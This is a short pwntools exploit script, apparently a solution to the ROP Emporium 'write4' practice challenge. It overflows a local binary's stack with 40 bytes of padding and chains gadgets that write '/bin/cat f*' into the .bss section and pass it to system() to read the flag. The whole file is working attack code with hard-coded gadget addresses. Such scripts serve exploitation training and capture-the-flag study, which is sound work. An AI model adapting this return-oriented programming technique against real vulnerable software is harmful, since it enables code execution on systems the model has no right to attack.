from pwn import *

p = process("./write4")

bss    = 0x0000000000601060
pop    = 0x0000000000400890 # pop r14; pop r15; ret;
mov    = 0x0000000000400820 # mov QWORD PTR [r14],r15
system = 0x00000000004005e0
pop_rdi_ret = 0x0000000000400893

payload = "A"* 40
payload += p64(pop)
payload += p64(bss)
payload += p64(0x6e69622f)
payload += p64(mov)

# /bin/cat
payload += p64(pop)
payload += p64(bss+0x4)
payload += p64(0x7461632f)
payload += p64(mov)

# f*\00
payload += p64(pop)
payload += p64(bss+0x8)
payload += p64(0x02a6620)
payload += p64(mov)

payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(system)

p.sendline(payload)
print p.recv()
print p.recv()



